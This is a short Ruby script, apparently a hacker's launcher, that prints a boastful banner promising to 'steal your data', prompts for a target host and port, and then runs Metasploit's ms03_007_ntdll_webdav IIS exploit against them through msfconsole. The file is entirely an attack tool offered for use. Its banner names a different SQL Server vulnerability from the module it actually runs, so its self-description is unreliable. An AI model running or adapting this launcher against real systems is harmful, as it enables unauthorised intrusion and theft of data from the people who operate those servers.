require 'colorize'
puts """

 	      Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...
  

         1st Try {set RPORT 80; 2nd RPORT 8080}

           SQL Server sp_replwritetovarbin 

		  Memory Corruption via SQL Inject
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp







exec("msfconsole -x 'use exploit/windows/iis/ms03_007_ntdll_webdav' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run'")

